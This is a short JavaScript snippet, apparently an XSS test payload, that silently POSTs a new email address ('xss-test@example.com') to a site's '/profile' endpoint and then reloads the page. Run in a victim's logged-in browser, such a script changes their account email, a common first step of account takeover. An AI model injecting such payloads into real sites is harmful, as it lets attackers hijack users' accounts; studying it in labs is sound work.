fetch('/profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'email=xss-test%40example.com'
}).then(() => {
    window.location = '/profile';
});